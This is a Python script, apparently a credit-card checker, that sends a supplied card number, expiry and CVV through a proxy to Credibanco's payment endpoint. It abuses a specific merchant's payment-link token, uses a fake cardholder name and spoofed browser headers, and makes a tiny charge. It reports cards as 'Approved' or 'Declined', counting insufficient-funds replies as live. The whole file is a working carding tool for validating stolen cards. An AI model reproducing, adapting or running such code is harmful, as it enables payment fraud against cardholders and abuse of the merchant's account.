import requests
from httpx import AsyncClient

async def credibanco(cc, mes, ano, cvv, proxy):
    client = AsyncClient(proxies=proxy, verify=False, timeout=None)
    
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://eco.credibanco.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://eco.credibanco.com/payment/docsite/payform-1.html?token=fl97l189i2i6iooqllei5d7evh&ask=amount&def=%7B%22IVAAmount%22:%2200.00%22%7D&def=%7B%22email%22:%22info@agro-costa.com%22%7D&def=%7B%22description%22:%22Link%2520de%2520pagos%2520Agro-Costa%2520SAS%22%7D&ask=%7B%22name%22:%22Factura%22,%22placeholder%22:%22Opcional%2520si%2520tiene%2520la%2520factura%22,%22label%22:%22Numero%2520Factura%22,%22value%22:%22%22,%22readOnly%22:%22false%22,%22regexp%22:%22%22%7D&ask=%7B%22name%22:%22OrdenCompra%22,%22placeholder%22:%22Opcional%2520si%2520tiene%2520aplica%22,%22label%22:%22Numero%2520Orden%2520Compra%22,%22value%22:%22%22,%22readOnly%22:%22false%22,%22regexp%22:%22%22%7D',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'api_token': 'fl97l189i2i6iooqllei5d7evh',
        'order': {
            'currency': 'COP',
            'amount': '1.00',
            'description': 'Link de pagos Agro-Costa SAS',
        },
        'backUrl': 'https://credibanco.com',
        'card': {
            'expiry': f'{ano}{mes}',
            'pan': cc,
            'cardHolderName': 'Don Pedro',
            'cvc': cvv,
        },
        'client': {
            'language': 'es',
            'email': 'info@agro-costa.com',
        },
        'addParams': {
            'installments': '1',
            'Factura': '',
            'OrdenCompra': '',
            'singleclick1': 'link'
        },
        'registeredFrom': 'SINGLE_CLICK',
    }
    req1 = await client.post('https://eco.credibanco.com/payment/rest/pay.do', headers=headers, json=json_data)
    await client.aclose() 

    if "La solicitud se procesó correctamente" in req1.text:
        status = "Approved ✅"
        mensaje = "Charged 0.23$"
    else:
        try:
            data = req1.json()
            mensaje = data.get('actionCodeDescription')
            if not mensaje:
                mensaje = data.get('orderStatus', {}).get('ErrorMessage')
            if not mensaje:
                mensaje = data.get('errorMessage', 'Declined')
        except Exception:
            mensaje = "Declined"
        
        if "Fondos insuficientes" in mensaje:
            status = "Approved ✅"
        else:
            status = "Declined ❌"
    return status, mensaje